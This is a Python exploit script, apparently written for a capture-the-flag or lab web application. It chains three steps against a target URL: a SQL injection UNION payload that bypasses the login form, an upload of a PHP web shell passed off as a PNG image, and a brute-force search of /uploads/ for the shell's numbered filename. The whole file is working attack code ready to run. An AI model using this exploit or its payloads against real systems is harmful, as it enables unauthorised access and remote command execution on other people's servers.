#!/usr/bin/python3
############################################################
# Your info goes in here
# 
############################################################
import argparse
import requests as req
import re

proxies = {
  #   "http" : "http://localhost:8080"
} 

LOGO = """\
__________.__                                _________    ___.                       ._____.           
\______   \  |   ____ _____    ______ ____  /   _____/__ _\_ |__   ______ ___________|__\_ |__   ____  
 |     ___/  | _/ __ \\__  \  /  ___// __ \ \_____  \|  |  \ __ \ /  ___// ___\_  __ \  || __ \_/ __ \ 
 |    |   |  |_\  ___/ / __ \_\___ \\  ___/ /        \  |  / \_\ \\___ \\  \___|  | \/  || \_\ \  ___/ 
 |____|   |____/\___  >____  /____  >\___  >_______  /____/|___  /____  >\___  >__|  |__||___  /\___  >
                    \/     \/     \/     \/        \/          \/     \/     \/              \/     \/
"""

class Pwn:
    def __init__(self, target):
        self.target = target
        self.s = req.Session()

    def get_csrf_token(self):
        r = self.s.get(self.target, proxies=proxies)
        result = re.findall("csrf-token\".*?value=\"(.*?)\".*?/>", r.text)
        return result[0]

    def auth_bypass(self, token):
        auth_payload = "' AND 1=0 UNION ALL SELECT \"random\",\"pass\";-- "
        obj = {'name' : auth_payload, 'password' : 'pass', 'csrf-token' : token}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = self.s.post(self.target + '/login.php', data=obj, proxies=proxies, headers=headers)
        return r.text

    def upload_shell(self):
        payload = b"<?php system($_REQUEST[\"cmd\"]); ?>"
        files = {'fileToUpload' : ('shell.php', payload, 'image/png')}
        r = self.s.post(self.target + '/upload.php', files=files, proxies=proxies)
        return r.text

    def find_the_shell(self):
        found = False
        result = "Fail"
        for i in range(10,99):
            name = "shell" + str(i) + ".php"
            if not found:
                r = self.s.get(self.target + '/uploads/' + name, proxies=proxies)
                if r.status_code == 200:
                    found = True
                    result = name
            else:
                break
        return result       

if __name__ == "__main__":
    # Passing arguments
    try:
        parser = argparse.ArgumentParser(prog="exploit.py", usage="%(prog)s -t https://<url>")
        parser.add_argument("-t", "--target", required=True, help="The target to point your amazing exploit at", type=str)
        args = parser.parse_args()
        print(LOGO)

        p = Pwn(args.target)
        token = p.get_csrf_token()
        login_result = p.auth_bypass(token)
        if login_result == "Succesfuly logged in!":
            print("(+) Authentication bypass worked")
            upload_result = p.upload_shell()
            if upload_result == "The file shell.php has been uploaded.":
                print("(+) Shell has been uploaded!")
                print("(+) Trying to find the shell...")
                search_result = p.find_the_shell()
                if search_result != "Fail":
                    print(f"(+) Success:  {search_result}")
                else:
                    print("(-) Search failed!")
            else:
                print("(-) File upload failed!")    
        else:
            print("(-) Authentication bypass failed!")

    except AssertionError as Error:
        print(Error.args[0])
        exit(1)